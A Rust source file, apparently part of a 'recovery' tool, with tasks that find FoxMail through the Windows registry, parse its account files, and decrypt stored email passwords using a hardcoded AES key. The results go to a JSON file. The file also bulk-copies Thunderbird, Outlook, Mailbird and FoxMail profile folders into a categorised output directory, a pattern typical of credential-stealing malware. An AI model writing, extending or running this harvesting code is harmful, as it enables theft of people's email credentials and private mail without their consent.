use crate::recovery::context::RecoveryContext;
use crate::recovery::fs::{copy_dir_limited, sanitize_label};
use crate::recovery::task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask};
use aes::Aes128;
use aes::cipher::{AsyncStreamCipher, KeyIvInit};
use async_trait::async_trait;
use cfb8::Decryptor;
use hex;
use roxmltree::Document;
use rusqlite::Connection;
use serde::Serialize;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use tokio::{fs, task};
use tracing::{debug, warn};
use winreg::RegKey;
use winreg::enums::{HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE};

pub struct DirectorySnapshotTask {
    label: String,
    category: RecoveryCategory,
    sources: Vec<PathBuf>,
    max_depth: usize,
    file_limit: usize,
}

impl DirectorySnapshotTask {
    pub fn new(
        label: impl Into<String>,
        category: RecoveryCategory,
        sources: Vec<PathBuf>,
    ) -> Self {
        Self {
            label: label.into(),
            category,
            sources,
            max_depth: 5,
            file_limit: 1024,
        }
    }

    pub fn with_limits(mut self, max_depth: usize, file_limit: usize) -> Self {
        self.max_depth = max_depth;
        self.file_limit = file_limit;
        self
    }

    fn reached_limit(&self, current: usize) -> bool {
        self.file_limit > 0 && current >= self.file_limit
    }
}

fn snapshot_task(
    label: &'static str,
    category: RecoveryCategory,
    sources: Vec<PathBuf>,
    max_depth: usize,
    file_limit: usize,
) -> Arc<dyn RecoveryTask> {
    Arc::new(
        DirectorySnapshotTask::new(label, category, sources).with_limits(max_depth, file_limit),
    )
}

#[async_trait]
impl RecoveryTask for DirectorySnapshotTask {
    fn label(&self) -> String {
        self.label.clone()
    }

    fn category(&self) -> RecoveryCategory {
        self.category
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let sanitized_label = sanitize_label(&self.label);
        let base_dir = ctx
            .output_dir
            .join("services")
            .join(self.category.to_string())
            .join(&sanitized_label);

        fs::create_dir_all(&base_dir).await?;

        let mut artifacts = Vec::new();

        for source in &self.sources {
            if self.reached_limit(artifacts.len()) {
                break;
            }

            match fs::metadata(source).await {
                Ok(metadata) if metadata.is_dir() => {
                    let folder_name = source
                        .file_name()
                        .and_then(|name| name.to_str())
                        .unwrap_or("source");
                    let dest = base_dir.join(sanitize_label(folder_name));

                    if let Err(err) = copy_dir_limited(
                        source,
                        &dest,
                        &self.label,
                        &mut artifacts,
                        self.max_depth,
                        self.file_limit,
                    )
                    .await
                    {
                        warn!(path=?source, error=?err, "failed to snapshot directory");
                    }
                }
                Ok(metadata) if metadata.is_file() => {
                    let dest_file = base_dir.join(
                        source
                            .file_name()
                            .and_then(|name| name.to_str())
                            .unwrap_or("file"),
                    );

                    if let Err(err) = fs::copy(source, &dest_file).await {
                        warn!(path=?source, error=?err, "failed to copy file source");
                        continue;
                    }

                    let meta = fs::metadata(&dest_file).await?;
                    artifacts.push(RecoveryArtifact {
                        label: self.label.clone(),
                        path: dest_file,
                        size_bytes: meta.len(),
                        modified: meta.modified().ok(),
                    });
                }
                Ok(_) => {
                    debug!(path=?source, "skipping unsupported source type");
                }
                Err(err) => {
                    debug!(path=?source, error=?err, "service source not available");
                }
            }
        }

        Ok(artifacts)
    }
}

const FOXMAIL_CIPHER_KEY: [u8; 16] = [
    0x7e, 0x46, 0x40, 0x37, 0x25, 0x6d, 0x24, 0x7e, 0x7e, 0x46, 0x40, 0x37, 0x25, 0x6d, 0x24, 0x7e,
];
const FOXMAIL_CIPHER_IV: [u8; 16] = [0u8; 16];
const FOXMAIL_FIRST_BYTE_DIFF: u8 = 0x71;

#[derive(Serialize)]
struct FoxMailAccount {
    account: String,
    password: String,
    is_pop3: bool,
}

struct FoxMailTask;

#[async_trait]
impl RecoveryTask for FoxMailTask {
    fn label(&self) -> String {
        "FoxMail Accounts".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::EmailClients
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let base = match locate_foxmail_path() {
            Some(base) => base,
            None => return Ok(Vec::new()),
        };

        let storage = base.join("Storage");
        if !storage.exists() {
            return Ok(Vec::new());
        }

        let storage_path = storage.clone();
        let accounts = task::spawn_blocking(move || parse_accounts_data(storage_path))
            .await
            .map_err(|err| RecoveryError::Custom(format!("foxmail parsing interrupted: {err}")))?
            .map_err(|err| RecoveryError::Custom(err))?;

        if accounts.is_empty() {
            return Ok(Vec::new());
        }

        let folder = ctx
            .output_dir
            .join("services")
            .join("Email Clients")
            .join("FoxMail");
        fs::create_dir_all(&folder).await?;

        let target = folder.join("content.json");
        let content = serde_json::to_string_pretty(&accounts)
            .map_err(|err| RecoveryError::Custom(err.to_string()))?;
        fs::write(&target, content).await?;
        let meta = fs::metadata(&target).await?;

        Ok(vec![RecoveryArtifact {
            label: self.label(),
            path: target,
            size_bytes: meta.len(),
            modified: meta.modified().ok(),
        }])
    }
}

fn locate_foxmail_path() -> Option<PathBuf> {
    const REG_PATH: &str = r"SOFTWARE\Classes\Foxmail.url.mailto\Shell\open\command";
    for hive in [HKEY_LOCAL_MACHINE, HKEY_CURRENT_USER] {
        if let Ok(key) = RegKey::predef(hive).open_subkey(REG_PATH) {
            if let Ok(value) = key.get_value::<String, _>("") {
                let parts: Vec<_> = value
                    .split('"')
                    .filter(|part| !part.trim().is_empty())
                    .collect();
                if let Some(first) = parts.first() {
                    if let Some(dir) = Path::new(first).parent() {
                        return Some(dir.to_path_buf());
                    }
                }
            }
        }
    }
    None
}

fn parse_accounts_data(storage: PathBuf) -> Result<Vec<FoxMailAccount>, String> {
    let xml_accounts = parse_xml_accounts(&storage)?;
    if !xml_accounts.is_empty() {
        return Ok(xml_accounts);
    }
    parse_db_accounts(&storage)
}

fn parse_xml_accounts(storage: &Path) -> Result<Vec<FoxMailAccount>, String> {
    let xml_path = storage.join("Accounts.xml");
    if !xml_path.exists() {
        return Ok(Vec::new());
    }

    let content = std::fs::read_to_string(&xml_path).map_err(|err| err.to_string())?;
    let document = Document::parse(&content).map_err(|err| err.to_string())?;
    let mut accounts = Vec::new();

    for node in document
        .descendants()
        .filter(|node| node.has_tag_name("Account"))
    {
        if let (Some(email), Some(password)) =
            (child_text(&node, "Email"), child_text(&node, "Password"))
        {
            let typ = child_text(&node, "Type");
            let is_pop3 =
                matches!(typ.as_deref(), Some(value) if value.eq_ignore_ascii_case("POP3"));
            let decrypted = decrypt_foxmail_password(&password).unwrap_or_else(|| password.clone());
            accounts.push(FoxMailAccount {
                account: email,
                password: decrypted,
                is_pop3,
            });
        }
    }

    Ok(accounts)
}

fn parse_db_accounts(storage: &Path) -> Result<Vec<FoxMailAccount>, String> {
    let db_path = storage.join("Accounts.db");
    if !db_path.exists() {
        return Ok(Vec::new());
    }

    let connection = Connection::open(db_path).map_err(|err| err.to_string())?;
    let mut stmt = connection
        .prepare("SELECT Email, Password, Type FROM Accounts")
        .map_err(|err| err.to_string())?;
    let mut rows = stmt.query([]).map_err(|err| err.to_string())?;
    let mut accounts = Vec::new();

    while let Some(row) = rows.next().map_err(|err| err.to_string())? {
        let email: Option<String> = row.get(0).ok();
        let password: Option<String> = row.get(1).ok();
        let typ: Option<String> = row.get(2).ok();
        if let (Some(email), Some(password)) = (email, password) {
            let is_pop3 =
                matches!(typ.as_deref(), Some(value) if value.eq_ignore_ascii_case("POP3"));
            let decrypted = decrypt_foxmail_password(&password).unwrap_or_else(|| password.clone());
            accounts.push(FoxMailAccount {
                account: email,
                password: decrypted,
                is_pop3,
            });
        }
    }

    Ok(accounts)
}

fn child_text<'a>(node: &'a roxmltree::Node, tag: &str) -> Option<String> {
    node.children()
        .find(|child| child.has_tag_name(tag))
        .and_then(|child| child.text())
        .map(|value| value.trim().to_string())
        .filter(|text| !text.is_empty())
}

fn decrypt_foxmail_password(encrypted: &str) -> Option<String> {
    let mut data = hex::decode(encrypted).ok()?;
    if data.is_empty() {
        return Some(String::new());
    }

    data[0] ^= FOXMAIL_FIRST_BYTE_DIFF;
    let decryptor =
        Decryptor::<Aes128>::new((&FOXMAIL_CIPHER_KEY).into(), (&FOXMAIL_CIPHER_IV).into());
    decryptor.decrypt(&mut data);

    if data.len() <= 1 {
        return Some(String::new());
    }

    let trimmed = String::from_utf8(data[1..].to_vec()).ok()?;
    Some(trimmed.trim_end_matches('\0').to_string())
}

fn email_specs(ctx: &RecoveryContext) -> Vec<(&'static str, Vec<PathBuf>, usize, usize)> {
    vec![
        (
            "FoxMail Storage",
            vec![
                ctx.local_data_dir.join("FoxMail"),
                ctx.roaming_data_dir.join("FoxMail"),
                ctx.home_dir.join("Foxmail"),
            ],
            4,
            512,
        ),
        (
            "Mailbird Profiles",
            vec![ctx.local_data_dir.join("Mailbird")],
            4,
            512,
        ),
        (
            "Thunderbird Profiles",
            vec![ctx.roaming_data_dir.join("Thunderbird").join("Profiles")],
            5,
            1024,
        ),
        (
            "Outlook Data",
            vec![
                ctx.local_data_dir.join("Microsoft").join("Outlook"),
                ctx.roaming_data_dir.join("Microsoft").join("Outlook"),
            ],
            4,
            768,
        ),
    ]
}

pub fn email_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
    let mut tasks: Vec<Arc<dyn RecoveryTask>> = email_specs(ctx)
        .into_iter()
        .map(|(label, sources, depth, limit)| {
            snapshot_task(label, RecoveryCategory::EmailClients, sources, depth, limit)
        })
        .collect();
    tasks.push(Arc::new(FoxMailTask));
    tasks
}
